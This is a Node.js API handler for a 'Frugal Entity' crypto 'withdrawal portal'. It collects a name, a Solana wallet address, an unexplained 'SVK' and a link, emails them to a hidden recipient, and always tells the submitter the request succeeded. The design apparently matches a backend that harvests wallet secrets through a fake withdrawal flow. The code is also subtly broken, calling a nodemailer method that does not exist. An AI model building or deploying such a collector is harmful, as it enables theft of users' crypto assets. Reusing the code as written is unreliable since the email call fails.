import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { name, walletAddress, svk, foundryLink } = req.body;

  // Validate required fields
  if (!name || !walletAddress || !svk || !foundryLink) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  // All email config from environment variables
  const smtpHost = process.env.SMTP_HOST;
  const smtpPort = parseInt(process.env.SMTP_PORT || '587');
  const smtpUser = process.env.SMTP_USER;
  const smtpPass = process.env.SMTP_PASS;
  const recipientEmail = process.env.RECIPIENT_EMAIL;

  if (!smtpHost || !smtpUser || !smtpPass || !recipientEmail) {
    console.error('Email environment variables not configured');
    // Still succeed (save data) even if email fails silently
    return res.status(200).json({ success: true, warning: 'Email not configured' });
  }

  const transporter = nodemailer.createTransporter({
    host: smtpHost,
    port: smtpPort,
    secure: smtpPort === 465,
    auth: {
      user: smtpUser,
      pass: smtpPass,
    },
  });

  const submittedAt = new Date().toLocaleString('en-US', {
    timeZone: 'UTC',
    dateStyle: 'full',
    timeStyle: 'long',
  });

  const emailHtml = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    body { font-family: 'Courier New', monospace; background: #0a0a0f; color: #e0e0ff; margin: 0; padding: 0; }
    .wrapper { max-width: 600px; margin: 0 auto; padding: 32px; }
    .header { background: linear-gradient(135deg, #9945FF, #14F195); padding: 2px; border-radius: 12px; margin-bottom: 24px; }
    .header-inner { background: #0f0f1a; border-radius: 10px; padding: 24px; text-align: center; }
    .logo { font-size: 32px; margin-bottom: 8px; }
    .title { font-size: 22px; font-weight: bold; color: #9945FF; letter-spacing: 2px; margin: 0; }
    .subtitle { font-size: 12px; color: rgba(20,241,149,0.7); margin-top: 4px; }
    .card { background: #0f0f1a; border: 1px solid rgba(153,69,255,0.3); border-radius: 8px; padding: 20px; margin-bottom: 16px; }
    .label { font-size: 11px; color: rgba(153,69,255,0.6); letter-spacing: 2px; text-transform: uppercase; margin-bottom: 6px; }
    .value { font-size: 15px; color: #e0e0ff; word-break: break-all; }
    .wallet { font-size: 13px; color: #14F195; }
    .timestamp { font-size: 11px; color: rgba(153,69,255,0.4); text-align: center; margin-top: 20px; }
    .badge { display: inline-block; background: rgba(20,241,149,0.1); border: 1px solid rgba(20,241,149,0.3); color: #14F195; font-size: 11px; padding: 4px 12px; border-radius: 20px; margin-bottom: 8px; }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="header">
      <div class="header-inner">
        <div class="logo">◎</div>
        <h1 class="title">NEW ENTRY RECEIVED</h1>
        <p class="subtitle">FRUGAL ENTITY · WITHDRAWAL PORTAL</p>
      </div>
    </div>

    <div class="badge">◉ NEW SUBMISSION</div>

    <div class="card">
      <div class="label">Full Name</div>
      <div class="value">${escapeHtml(name)}</div>
    </div>

    <div class="card">
      <div class="label">Solana Wallet Address</div>
      <div class="value wallet">${escapeHtml(walletAddress)}</div>
    </div>

    <div class="card">
      <div class="label">SVK</div>
      <div class="value">${escapeHtml(svk)}</div>
    </div>

    <div class="card">
      <div class="label">Foundry Link</div>
      <div class="value"><a href="${escapeHtml(foundryLink)}" style="color:#9945FF;">${escapeHtml(foundryLink)}</a></div>
    </div>

    <p class="timestamp">Submitted at ${submittedAt}</p>
  </div>
</body>
</html>
  `;

  const emailText = `
NEW FRUGAL ENTITY SUBMISSION
=============================
Submitted: ${submittedAt}

Name: ${name}
Wallet Address: ${walletAddress}
SVK: ${svk}
Foundry Link: ${foundryLink}
  `;

  try {
    await transporter.sendMail({
      from: `"Frugal Entity Portal" <${smtpUser}>`,
      to: recipientEmail,
      subject: `◎ New Entry: ${name} · Frugal Entity Portal`,
      text: emailText,
      html: emailHtml,
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Email send error:', error);
    // Return success anyway so user flow isn't broken
    return res.status(200).json({ success: true, warning: 'Email delivery issue' });
  }
}

function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}
